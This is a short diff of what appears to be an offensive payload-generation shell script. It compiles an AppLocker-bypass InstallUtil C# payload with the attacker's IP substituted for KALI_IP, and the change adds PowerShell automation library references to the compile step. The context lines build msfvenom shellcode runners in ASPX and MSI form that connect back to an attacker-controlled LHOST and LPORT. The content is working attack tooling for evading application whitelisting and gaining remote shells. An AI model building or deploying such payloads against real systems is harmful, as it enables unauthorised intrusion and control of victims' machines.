@@ -128,7 +128,7 @@ mv Templates/MSI/shellcode_runner.msi payloads/MSI/shellcode_runner.msi
 echo "[+] Creating InstallUtil ..."
 cp Templates/Applocker/InstallUtil.cs payloads/Applocker/
 sed -i 's/KALI_IP/'${LHOST}'/g' payloads/Applocker/InstallUtil.cs
-mcs -out:payloads/Applocker/InstallUtil.exe payloads/Applocker/InstallUtil.cs &>/dev/null
+mcs -r:Templates/Applocker/System.Management.Automation.dll -r:System.Configuration.Install -out:payloads/Applocker/InstallUtil.exe payloads/Applocker/InstallUtil.cs
 
 echo "[+] Creating web.config file (Non-Encrypted)..."
 MSFVENOM=" -p $MSFVENOM_PAYLOAD LHOST=$LHOST LPORT=$LPORT -f aspx -o payloads/ASPX/shellcode_runner.aspx"
